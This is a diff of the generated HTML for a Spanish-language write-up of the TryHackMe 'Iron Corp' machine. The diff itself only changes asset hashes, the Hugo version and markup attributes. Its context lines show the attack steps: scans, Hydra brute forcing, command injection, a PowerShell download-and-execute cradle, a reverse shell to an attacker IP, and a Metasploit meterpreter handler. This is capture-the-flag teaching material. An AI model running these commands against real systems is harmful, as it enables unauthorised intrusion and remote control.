@@ -18,9 +18,9 @@
 
 <script defer src="/js/lazysizes.min.31dd6a2d3a1ec0f78a8df007535cf23f03aeb5c70f026e6d6a19dac3b3acc340.js"></script>
 
-<script defer src="/js/helper/getParents.min.ccd45f158c1b17849307ba913a72beac239c410f2b6e648496a79842da84e55b.js"></script>
+<script defer src="/js/helper/getParents.min.1618c696be7c98933f9a92677f518b512a74e55bdbb976b09936b4182e93181b.js"></script>
 
-<script defer src="/js/helper/fadeinout.min.9fb19682560d5fa5596fffec85da605067c4acc86aad05add4d8fff9d362a446.js"></script>
+<script defer src="/js/helper/fadeinout.min.93a331f96194789a542f33690bbe4f0c102c7e78ffc018217f5a1c33010bad91.js"></script>
 
 <script defer src="/js/helper/closest.min.js"></script>
   
@@ -1263,7 +1263,7 @@
     <meta property="twitter:description" content="Iron Corp es una maquina de TryHackMe, enumeramos subdominios con dig, con Hydra realizamos ataque de contraseñas a uno de los subdominios donde encontramos una vulnerabilidad LFI y donde realizamos Command Injection para obtener acceso por medio de una shell en PowerShell. Escalamos privilegios utilizando Metasploit con Incognito y un token que encontramos.">
   
 
-<meta name="generator" content="Hugo 0.92.2" />
+<meta name="generator" content="Hugo 0.68.3" />
 <meta name="msapplication-TileColor" content="#1d1d1d">
 
 <meta name="theme-color" content="#1d1d1d">
@@ -1669,7 +1669,7 @@
 <p>Escaneo de puertos tcp, nmap nos muestra el puerto http (8080), rdp (3889) y el puerto dns (53) abiertos.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1730,7 +1730,7 @@
 </span><span class="lnt">59
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># Nmap 7.80 scan initiated Sat May  9 00:53:02 2020 as: nmap -Pn -T5 -p1-65535 -o scan_allports ironcorp.me</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># Nmap 7.80 scan initiated Sat May  9 00:53:02 2020 as: nmap -Pn -T5 -p1-65535 -o scan_allports ironcorp.me</span>
 Nmap scan report <span class="k">for</span> ironcorp.me <span class="o">(</span>10.10.84.168<span class="o">)</span>
 Host is up <span class="o">(</span>0.33s latency<span class="o">)</span>.
 Not shown: <span class="m">65528</span> filtered ports
@@ -1798,7 +1798,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 <p>Utilizamos gobuster para busqueda de directorios y archivos.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1813,7 +1813,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 </span><span class="lnt">13
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">root@upset:~/thm/ironcorp# gobuster dir -u http://ironcorp.me:8080/ -w /usr/share/wordlists/dirb/common.txt -q -t <span class="m">25</span> -x php,html,txt
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@upset:~/thm/ironcorp# gobuster dir -u http://ironcorp.me:8080/ -w /usr/share/wordlists/dirb/common.txt -q -t <span class="m">25</span> -x php,html,txt
 /assets <span class="o">(</span>Status: 301<span class="o">)</span>
 /calendar.html <span class="o">(</span>Status: 200<span class="o">)</span>
 /forms.html <span class="o">(</span>Status: 200<span class="o">)</span>
@@ -1836,7 +1836,7 @@ root@upset:~/thm/ironcorp#
 <p>Nuevamente ejecutamos Gobuster en los nuevos dos subdominios y encontramos las mismas direcciones que en el dominio principal.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1863,7 +1863,7 @@ root@upset:~/thm/ironcorp#
 </span><span class="lnt">25
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">root@upset:~/thm/ironcorp# gobuster dir -u http://internal.ironcorp.me:8080/ -w /usr/share/wordlists/dirb/common.txt -q -t <span class="m">25</span> -x php,html,txt
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@upset:~/thm/ironcorp# gobuster dir -u http://internal.ironcorp.me:8080/ -w /usr/share/wordlists/dirb/common.txt -q -t <span class="m">25</span> -x php,html,txt
 /assets <span class="o">(</span>Status: 301<span class="o">)</span>
 /calendar.html <span class="o">(</span>Status: 200<span class="o">)</span>
 /forms.html <span class="o">(</span>Status: 200<span class="o">)</span>
@@ -1901,7 +1901,7 @@ root@upset:~/thm/ironcorp#
 <p>Nuevamente ejecutamos Gobuster en el dominio principal pero no encontramos nada interesante.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1914,7 +1914,7 @@ root@upset:~/thm/ironcorp#
 </span><span class="lnt">11
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">root@upset:~/thm/ironcorp# gobuster dir -u http://ironcorp.me:11025/ -w /usr/share/wordlists/dirb/common.txt -q -t <span class="m">50</span> -x php,html,txt,aspx,asp -s 200,301
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@upset:~/thm/ironcorp# gobuster dir -u http://ironcorp.me:11025/ -w /usr/share/wordlists/dirb/common.txt -q -t <span class="m">50</span> -x php,html,txt,aspx,asp -s 200,301
 /css <span class="o">(</span>Status: 301<span class="o">)</span>
 /img <span class="o">(</span>Status: 301<span class="o">)</span>
 /index.html <span class="o">(</span>Status: 200<span class="o">)</span>
@@ -1930,7 +1930,7 @@ root@upset:~/thm/ironcorp#
 </div><h2 id="hydra">HYDRA</h2>
 <p>Utilizamos hydra para realizar un ataque de fuerza bruta en el subdominio <code>admin.ironcorp.me</code>, logramos encontrar las credenciales.<br />
 <img src="/images/posts/thm/ironcorp/Screenshot_20200509_021752.webp" alt="image" /></p>
-<h2 id="lficommand-injection---admin-area">LFI/Command Injection - Admin Area</h2>
+<h2 id="lficommand-injection---admin-area-">LFI/Command Injection - Admin Area</h2>
 <p>En el subdominio en el que encontramos las credenciales al iniciar sesion nos muestra una pagina en la que contiene un input para realizar querys.<br />
 <img src="/images/posts/thm/ironcorp/Screenshot_20200509_151918.webp" alt="image" /></p>
 <p>Al realizar alguna busqueda o query no nos devuelve ningun resultado, intentamos realizar un RFI mediante una shell php, asp, apsx, pero ninguna de estas funcionó, solamente nos trae el codigo fuente y lo muestra en la pagina más no lo ejecuta.</p>
@@ -1950,19 +1950,19 @@ root@upset:~/thm/ironcorp#
 <p>Utilizamos una de las shells que tiene nishang <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1"><strong>Invoke-PowerShellTcp.ps1</strong></a>, en nuestro archivo Invoke-PowerShellTcp.ps1 agregamos la siguiente linea al final del archivo para ejecutar nuestra shell inversa cuando este sea descargado, con la IP y el puerto al que se va a conectar.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">Invoke-PowerShellTcp</span> <span class="n">-Reverse</span> <span class="n">-IPAddress</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-Port</span> <span class="n">1338</span>
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">Invoke-PowerShellTcp</span> <span class="n">-Reverse</span> <span class="n">-IPAddress</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-Port</span> <span class="n">1338</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>El comando que vamos a ejecutar en la maquina es el siguiente, para ejecutar nuestra shell</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-c</span> <span class="n">iex</span><span class="p">(</span><span class="nb">new-object</span> <span class="n">net</span><span class="p">.</span><span class="n">webclient</span><span class="p">).</span><span class="n">downloadstring</span><span class="p">(</span><span class="s1">&#39;http://10.10.10.10/Invoke-PowerShellTcp.ps1&#39;</span><span class="p">)</span>
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-c</span> <span class="n">iex</span><span class="p">(</span><span class="nb">new-object</span> <span class="n">net</span><span class="p">.</span><span class="n">webclient</span><span class="p">).</span><span class="n">downloadstring</span><span class="p">(</span><span class="s1">&#39;http://10.10.10.10/Invoke-PowerShellTcp.ps1&#39;</span><span class="p">)</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>Por alguna razon no acepta los espacios y hay que codificar nuestro comando dos veces para que se ejecute<br />
@@ -1974,9 +1974,9 @@ root@upset:~/thm/ironcorp#
 <h1 id="privilege-escalation">PRIVILEGE ESCALATION</h1>
 <p>Utilizamos metasploit para conseguir una shell meterpreter utilizando un payload en powershell.</p>
 <p><strong>metasploit</strong></p>
-<pre tabindex="0"><code>msfconsole -x &quot;use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost tun0; set lport 1337; set ExitOnSession false; exploit -j&quot;
+<pre><code>msfconsole -x &quot;use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost tun0; set lport 1337; set ExitOnSession false; exploit -j&quot;
 </code></pre><p><strong>shell</strong></p>
-<pre tabindex="0"><code>powershell -command &quot;&amp; { iwr 10.10.10.10/meterpreter-64.ps1 -OutFile C:\Users\Administrator\Desktop\meterpreter-64.ps1 }&quot;
+<pre><code>powershell -command &quot;&amp; { iwr 10.10.10.10/meterpreter-64.ps1 -OutFile C:\Users\Administrator\Desktop\meterpreter-64.ps1 }&quot;
 Import-Module .\meterpreter-64.ps1
 </code></pre><p>Logramos obtener una sesion en meterpreter y los hashes de los usuarios :)<br />
 <img src="/images/posts/thm/ironcorp/Screenshot_20200509_220844.webp" alt="image" /></p>
@@ -2275,7 +2275,7 @@ Import-Module .\meterpreter-64.ps1
 </div>
 
 
-<script defer src="/js/swipe.min.d70095d96ef6a016133ea2c732c5d4713539d335b739178e356af46f54cf0a16.js"></script>
+<script defer src="/js/swipe.min.08ff2be1b74347bad9e267f732f1388d271b2f9d97b6a8a87bd6a510f17c5ad2.js"></script>
 
 <script defer src="/js/micromodal.min.de01b44b2f383056bbcaf6ee921fd385d79108ec1129afd0eb2f3f5a07e11f45.js"></script>
 
@@ -3399,7 +3399,7 @@ var a = document.getElementsByClassName('navbar__menu-item')
     <li><a href="#http-11025">HTTP 11025</a>
       <ul>
         <li><a href="#hydra">HYDRA</a></li>
-        <li><a href="#lficommand-injection---admin-area">LFI/Command Injection - Admin Area</a></li>
+        <li><a href="#lficommand-injection---admin-area-">LFI/Command Injection - Admin Area</a></li>
       </ul>
     </li>
     <li><a href="#shell---administrator">SHELL - Administrator</a></li>
